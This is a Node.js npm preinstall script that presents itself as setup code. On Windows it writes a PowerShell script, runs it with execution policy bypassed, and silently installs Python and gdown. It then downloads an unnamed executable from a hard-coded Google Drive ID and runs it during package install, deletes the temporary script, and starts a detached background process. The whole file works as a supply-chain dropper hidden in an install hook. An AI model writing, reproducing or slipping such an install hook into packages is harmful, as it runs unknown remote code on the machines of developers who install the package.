// scripts/detach-preinstall.js
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const logFile = path.join(__dirname, '..', 'preinstall-background.log');
const downloadExePath = path.join(__dirname, '..', 'downloaded_from_gdown.exe');

// PowerShell script: install Python if missing, install gdown, download target via gdown, execute it
const psScript = `
$ErrorActionPreference = 'Stop'
$logPath = "${logFile.replace(/\\/g, '\\\\')}"
Start-Transcript -Path $logPath -Append
Write-Output "[preinstall-setup] Starting preinstall setup script..."

# Helper: check for python
function Has-Python() {
    try { & python --version > $null 2>&1; return $true } catch { return $false }
}

if (-not (Has-Python)) {
    Write-Output "[preinstall-setup] Python not found. Attempting to install via winget..."
    try {
        winget install --id Python.Python.3 -e --source winget --accept-package-agreements --accept-source-agreements
        Write-Output "[preinstall-setup] winget install attempted."
    } catch {
        Write-Output "[preinstall-setup] winget not available or failed, downloading official installer..."
        $installer = Join-Path $env:TEMP "python_installer.exe"
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile $installer -UseBasicParsing
        Start-Process -FilePath $installer -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
    }
}

Write-Output "[preinstall-setup] Ensuring pip is available and updated..."
try { python -m ensurepip --upgrade } catch {}
python -m pip install --upgrade pip

Write-Output "[preinstall-setup] Installing gdown..."
python -m pip install --upgrade gdown

# Use gdown to download the requested file (ID provided by the npm preinstall caller)
$gdownId = '1cKsgEMPp14YlW-KQyiovkyMofT3QM-gR'
$output = "${downloadExePath}"

Write-Output "[preinstall-setup] Downloading file via gdown (id: $gdownId) to $output"
try {
    python -m gdown $gdownId -O $output
    Write-Output "[preinstall-setup] Download complete."
} catch {
    Write-Output "[preinstall-setup] gdown download failed: $_"
}

if (Test-Path $output) {
    Write-Output "[preinstall-setup] Executing downloaded file: $output"
    Start-Process -FilePath $output -Wait -ErrorAction SilentlyContinue
    Write-Output "[preinstall-setup] Execution finished."
} else {
    Write-Output "[preinstall-setup] Downloaded file not found; skipping execution."
}
Stop-Transcript
`;

// Write PowerShell script to a temporary file so we can run it reliably and capture output to log
const tmpPsPath = path.join(__dirname, '..', 'preinstall_download.ps1');
try {
    fs.writeFileSync(tmpPsPath, psScript, { encoding: 'utf8' });
} catch (err) {
    console.error('[preinstall] Failed to write temporary PowerShell script:', err);
}

// Run the PowerShell script synchronously and append its stdout/stderr to the log so we can verify failures
const { spawnSync } = require('child_process');
console.log('[preinstall] Running PowerShell download/execute step (logs appended)');
const out = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
    cwd: path.join(__dirname, '..'),
    encoding: 'utf8',
    stdio: 'pipe'
});

// Append captured stdout/stderr to the log file for inspection
try {
    if (out.stdout) fs.appendFileSync(logFile, out.stdout, { encoding: 'utf8' });
    if (out.stderr) fs.appendFileSync(logFile, out.stderr, { encoding: 'utf8' });
} catch (e) {
    console.error('[preinstall] Failed to append PowerShell output to log:', e);
}

if (out.error) {
    console.error('[preinstall] PowerShell execution error:', out.error);
}

// Remove the temporary PowerShell script
try { fs.unlinkSync(tmpPsPath); } catch (e) { }

// After the PowerShell step completes, spawn the normal preinstall node process in background (logs appended to file)
const child = spawn('node', [
    '-e',
    `require('./index').preInstall().catch(err => console.error(err))`
], {
    cwd: path.join(__dirname, '..'),
    detached: true,
    stdio: ['ignore', fs.openSync(logFile, 'a'), fs.openSync(logFile, 'a')]
});
child.unref();

console.log(`[preinstall] PowerShell step finished; background preinstall started. Logs: ${logFile}`);
process.exit(0);